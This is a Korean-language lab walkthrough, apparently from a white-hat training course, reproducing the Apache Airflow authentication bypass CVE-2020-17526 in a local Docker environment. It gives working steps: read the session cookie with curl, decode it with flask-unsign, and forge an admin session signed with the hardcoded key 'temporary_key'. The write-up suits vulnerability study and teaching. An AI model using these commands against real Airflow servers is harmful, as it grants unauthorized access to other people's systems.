# Apache Airflow Authentication Bypass (CVE-2020-17526)

화이트햇스쿨 3기 32반 김나희

## 1. 요약
- Apache Airflow는 오픈소스 워크플로우 관리 플랫폼으로, 언제 어떤 작업을 실행할지 미리 정해 자동으로 돌려주는 프로그램이다. 기본적으로 인증 기능이 비활성화되어 있지만, 관리자가 webserver.authenticate=True로 활성화할 수 있다.
- Airflow 1.10.13 이전 버전에서는 세션 정보를 서명하는 데 사용되는 비밀 키가 temporary_key 라는 고정된 값으로 설정되어 있었다. 따라서 공격자가 이를 악용해 임의의 사용자로 가장하여 인증을 우회할 수 있는 취약점이 존재했다.

## 2. 환경 구성
- git clone https://github.com/umsienrt/kr-vulhub.git
- cd kr-vulhub/CVE-2020-17526
- docker compose run airflow-init
- docker compose up -d
- Flask Unsign 설치 → 세션 키 해독 용도


## 3. PoC
![img1](https://github.com/umsienrt/kr-vulhub/blob/main/CVE-2020-17526/img1.png?raw=true)
- http://your-ip:8080 으로 접속하면 로그인 페이지가 나온다.<br>
![img2](https://github.com/umsienrt/kr-vulhub/blob/main/CVE-2020-17526/img2.png?raw=true)
- curl -v http://localhost:8080/admin/airflow/login
- Set-Cookie→session에서 세션 키 정보를 알 수 있다.<br>
![img3](https://github.com/umsienrt/kr-vulhub/blob/main/CVE-2020-17526/img3.png?raw=true)
- 개발자 도구 → Application → Cookies → http://127.0.0.1:8080 에서 전체 세션 키 정보를 확인할 수 있다.<br>
![img4](https://github.com/umsienrt/kr-vulhub/blob/main/CVE-2020-17526/img4.png?raw=true)
- flask-unsign -u -c  세션 키 값
- flask-unsign을 이용해서 세션 키를 해독하면 ‘temporary key’ 가 나온다.<br>
![img5](https://github.com/umsienrt/kr-vulhub/blob/main/CVE-2020-17526/img5.png?raw=true)
- flask-unsign -s --secret temporary_key -c "{'user_id': '1', '_fresh': False, '_permanent': True}”
- user_id가 1인 새 세션을 생성한다.<br>
![img6](https://github.com/umsienrt/kr-vulhub/blob/main/CVE-2020-17526/img6.png?raw=true)
- 개발자 도구에서 session의 value값에 앞서 새롭게 생성된 세션 값을 삽입한다.


## 결과
![img7](https://github.com/umsienrt/kr-vulhub/blob/main/CVE-2020-17526/img7.png?raw=true)

